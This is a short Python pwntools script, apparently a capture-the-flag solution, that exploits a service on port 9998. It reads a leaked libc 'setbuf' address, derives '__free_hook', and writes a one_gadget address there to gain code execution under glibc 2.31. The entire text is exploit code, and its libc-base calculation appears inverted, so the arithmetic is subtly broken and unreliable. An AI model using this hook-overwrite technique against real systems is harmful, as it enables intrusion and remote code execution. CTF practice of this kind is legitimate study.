from pwn import *

r = remote("0.0.0.0", 9998)

# l = ELF("./libc-2.31.so")
l = ELF("/usr/lib/libc-2.31.so")

setbuf = l.symbols['setbuf']

free_hook = l.symbols['__free_hook']

offset = free_hook - setbuf

info = r.recvuntil("\n")

libc_setbuf = int(info.split(b":")[1][2:-1],16)

write_addr = libc_setbuf + offset

libc_base = setbuf - libc_setbuf

one_gadget = 0xe6ce3

exec_addr = one_gadget + libc_base

r.sendline(p64(exec_addr))

r.sendline(p64(write_addr))

r.sendline("1337")
